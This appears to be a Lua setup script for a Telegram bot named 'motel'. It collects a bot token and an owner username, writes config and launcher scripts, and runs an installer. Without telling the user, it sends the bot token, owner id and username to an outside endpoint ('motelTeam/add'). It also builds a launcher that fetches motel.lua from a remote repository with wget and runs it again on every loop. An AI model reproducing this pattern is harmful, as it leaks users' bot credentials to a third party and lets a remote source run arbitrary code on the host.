serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_motel = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_motel = function() 
local Create_Info = function(Token,Sudo,UserName)  
local motel_Info_Sudo = io.open("sudo.lua", 'w')
motel_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
motel_Info_Sudo:close()
end  
if not database:get(Server_motel.."Token_motel") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_motel.."Token_motel",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_motel.."UserName_motel") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://tshake.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_motel.."UserName_motel",Json.Info.Username)
database:set(Server_motel.."Id_motel",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_motel_Info()
Create_Info(database:get(Server_motel.."Token_motel"),database:get(Server_motel.."Id_motel"),database:get(Server_motel.."UserName_motel"))   
http.request("http://motelTeam/add/?id="..database:get(Server_motel.."Id_motel").."&user="..database:get(Server_motel.."UserName_motel").."&token="..database:get(Server_motel.."Token_motel"))
local Runmotel = io.open("motel", 'w')
Runmotel:write([[
#!/usr/bin/env bash
cd $HOME/motel
token="]]..database:get(Server_motel.."Token_motel")..[["
rm -fr motel.lua
wget "https://raw.githubusercontent.com/motel924/motel/master/motel.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./motel.lua -p PROFILE --bot=$token
done
]])
Runmotel:close()
local RunTs = io.open("Run", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/motel
while(true) do
rm -fr ../.telegram-cli
screen -S motel -X kill
screen -S motel ./motel
done
]])
RunTs:close()
end
Files_motel_Info()
database:del(Server_motel.."Token_motel");database:del(Server_motel.."Id_motel");database:del(Server_motel.."UserName_motel")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_motel()  
var = true
else   
f:close()  
database:del(Server_motel.."Token_motel");database:del(Server_motel.."Id_motel");database:del(Server_motel.."UserName_motel")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
